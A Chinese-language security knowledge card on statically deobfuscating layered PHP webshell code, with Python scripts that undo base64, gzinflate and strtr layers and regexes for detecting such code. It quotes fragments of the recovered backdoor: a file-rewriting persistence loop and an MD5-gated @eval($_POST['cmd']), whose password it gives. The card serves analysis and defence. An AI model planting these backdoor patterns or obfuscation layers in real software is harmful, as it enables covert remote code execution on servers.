---
id: code-analysis-reverse-obfuscation-php-gzinflate-strtr-base64-unwrap
title: PHP gzinflate+strtr+base64 多层混淆静态还原：从 eval 壳取出 backdoor 源码
type: scenario
domain: code-analysis
path: code-analysis/reverse/obfuscation
technique: php-gzinflate-strtr-base64-eval-unwrap
aliases:
- PHP 多层混淆
- eval(gzinflate(base64_decode()))
- PHP 混淆马还原
- strtr 字符替换解码
- 冰蝎/后门源码提取
- PHP deobfuscation
tags:
- php
- obfuscation
- gzinflate
- base64
- strtr
- eval
- webshell
- deobfuscation
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V201
  verified_at: '2026-11-07T02:10:27+08:00'
  notes: 已对照原文与全部61张图核对；未复跑PoC
---

## 一句话结论

PHP 恶意代码常用 `eval(gzinflate(base64_decode('...')))` 起壳，内层再用字符映射表拼出变量函数、`strtr` 置换与二次 base64 解码；不需要执行样本，只要逐层识别 `base64_decode`、`gzinflate`、`strtr` 的参数关系，用 Python 复现同样的字节变换，就能把最终后门源码完整还原出来。

## 原理

- **外层压缩+编码**：`base64_decode` 把不可读的 base64 文本还原为 zlib 流，`gzinflate` 解压得到 PHP 代码；这是 webshell/后门最常见的“压缩壳”，本身不加密，只是让源码不可读。
- **内层字符映射**：解压后的代码通常先定义一张字符表（如 `urldecode("n1zb/ma5\vt0i28-pxuqy*6lrkdg9_ehcswo4+f37j")`），再用下标拼接出函数名/变量名（`$O00O0O = ...`），并用 `strtr`、`substr`、`base64_decode` 组合实现解码函数；变量名随机、函数名动态，静态搜索 `eval` 很难直接看到明文。
- **三段式 base64 串**：样本把最终载荷编码成一个长 base64 串 `$O0O000`，再拆成 `c`（前 52 字符）、`b`（中间 52 字符）、`a`（剩余部分）；`strtr(a, b, c)` 用 `b→c` 的字符映射替换 `a`，得到合法 base64 文本，最后 `base64_decode` 还原 PHP 源码。等价于“把字符表藏在串头，数据在串尾，用同长度替换还原字母表”。
- **为什么能不执行就还原**：所有变换都是确定性的字符串/字节操作，参数都在源码里；用 Python 的 `base64`、`zlib`、`bytes.translate`/`str.maketrans` 复现即可。执行 `eval` 反而可能触发反调试、写文件、回连等副作用。
- **最终载荷**：解码后常见 `ignore_user_abort(true); set_time_limit(0); $file='./backdoor.php'; ... while(1){ file_put_contents($file,$hack.$code); usleep(5000); }` 之类的驻留后门，以及 `if(md5($_GET['flag2'])=='...'){@eval($_POST['cmd']);}` 的 MD5 口令门。
- **MD5 口令门**：源码中的 MD5 值可直接拿去离线字典/在线库查询；本例 `87c298a56e0caa355872ab47db11e06c` 对应 `ns2025`。这只是口令校验，不是加密，弱口令可秒破。

## 触发条件

- 拿到可疑 PHP 文件（Web 目录、备份、镜像、源码包），其中出现 `eval`、`gzinflate`、`base64_decode`、`strtr`、大段 base64/十六进制字符串。
- 样本未使用需要外部密钥的加密（如 AES），或密钥/字符表就在同一文件内。
- 分析环境具备 Python/PHP 解释器，但不要直接执行样本；用静态脚本复现变换。
- 内层混淆的参数（分段长度、字符表、函数名）可从源码中读出；若被进一步加密/加壳，需要先脱壳。

## 利用步骤

1. **识别外层**：搜索 `eval(`、`assert(`、`gzinflate(`、`gzuncompress(`、`base64_decode(`、`str_rot13(`、`strtr(`；记录嵌套关系。
2. **解外层**：提取 `base64_decode` 的字符串，Python `base64.b64decode` 后 `zlib.decompress(data, -15)`（`gzinflate` 对应 raw deflate）；若失败尝试 `zlib.decompress(data)`（带 zlib 头）或 `gzuncompress`。
3. **读内层**：解压结果通常是一段 PHP，含字符表与动态变量函数；不要执行，先把所有字符串常量、下标表达式、`strtr` 调用抄出来，或用 PHP 的 `token_get_all` 做轻量解析。
4. **提取最终载荷串**：找到 `$O0O000 = "..."` 这类长 base64；确认分段长度（本例为 52）与 `strtr` 的方向（`strtr($data, $from, $to)`，本例 `from` 是中间段、`to` 是前段）。
5. **复现替换+解码**：按 `c = O[:52]`、`b = O[52:104]`、`a = O[104:]` 切分；`mapped = a.translate(str.maketrans(b, c))`；`base64.b64decode(mapped)`；得到最终 PHP 源码。
6. **审读载荷**：查找 `file_put_contents`、`fwrite`、`eval`、`system`、`assert`、`md5(`、`$_POST`、`$_GET`、`ignore_user_abort`、`set_time_limit`；提取回连地址、写入路径、口令哈希。
7. **口令破解**：把 `md5(...)=='...'` 中的哈希送字典/在线库；弱口令直接得到明文。不要在生产环境执行后门验证。

## PoC

外层解压：

```python
import base64, zlib

b64 = "HWND..."  # 从 eval(gzinflate(base64_decode('...'))) 中提取
raw = base64.b64decode(b64)
try:
    code = zlib.decompress(raw, -15)   # gzinflate: raw deflate
except zlib.error:
    code = zlib.decompress(raw)        # 带 zlib 头的变体
print(code.decode("utf-8", "replace"))
```

内层三段式还原（本例）：

```python
import base64

O = "OpZoa..."          # 从解压结果中的 $O0O000 提取
chunk = 52              # 由混淆器参数推出：前两段各 52 字符

c = O[:chunk]           # 第 1 段
b = O[chunk:2 * chunk]  # 第 2 段
a = O[2 * chunk:]       # 第 3 段（数据）

mapped = a.translate(str.maketrans(b, c))   # PHP strtr($a, $b, $c)
plain = base64.b64decode(mapped)
print(plain.decode("utf-8", "replace"))
```

若分段长度不是 52，按内层 `substr($O0O000, 0, N)`、`substr($O0O000, N, N)`、`substr($O0O000, 2*N)` 的参数 N 调整；`strtr` 的参数顺序以 PHP 源码为准（`strtr(string, from, to)`）。

## 变体与关联

- **`gzuncompress`/`gzdecode`**：分别对应 zlib 头和 gzip 头，Python 用 `zlib.decompress(data)`、`zlib.decompress(data, 16+MAX_WBITS)`。
- **`str_rot13` 壳**：直接 `codecs.decode(s, 'rot13')`；常与 base64 串联。
- **异或壳**：`$s ^ $key` 或逐字节 XOR，需要从源码提取 key；可写 Python 暴力验证可见字符。
- **多层嵌套**：反复对解压结果做“找 eval→提取参数→解码”，直到没有 `eval`/`assert`；记录每层哈希以便溯源。
- **PHP 变量函数**：`$f='system'; $f('id')`、`$a[$b]($c)` 等动态调用，静态审读时要把变量值代入；不要被随机变量名干扰。
- **关联卡片**：[[web-php-rce-eval-var-dump-superglobal-variable-function]]（eval 变量函数注入）；[[web-php-rce-no-alnum-self-increment-variable-function]]（无字母数字构造函数名）；[[defense-forensics-godzilla-php-webshell-traffic-decode]]（哥斯拉流量解密）。

## 检测与防御

- **静态检测**：对 Web 目录做 YARA/正则扫描：`eval\s*\(\s*gzinflate`、`eval\s*\(\s*base64_decode`、超长 base64 字符串、`strtr`+`substr`+`base64_decode` 组合、`ignore_user_abort`+`set_time_limit(0)`。
- **权限与隔离**：Web 进程禁止写入 Web 根目录；禁用 `eval`/`assert` 等危险函数（disable_functions 只能提高门槛）；容器只读根文件系统。
- **文件完整性**：监控 Web 目录新增/修改 PHP 文件，尤其是体积小、变量名随机、mtime 与上传时间吻合的文件。
- **应急**：发现后门先隔离样本、保留哈希与源码；不要直接执行；排查 `backdoor.php`、计划任务、外连地址与写入时间线。
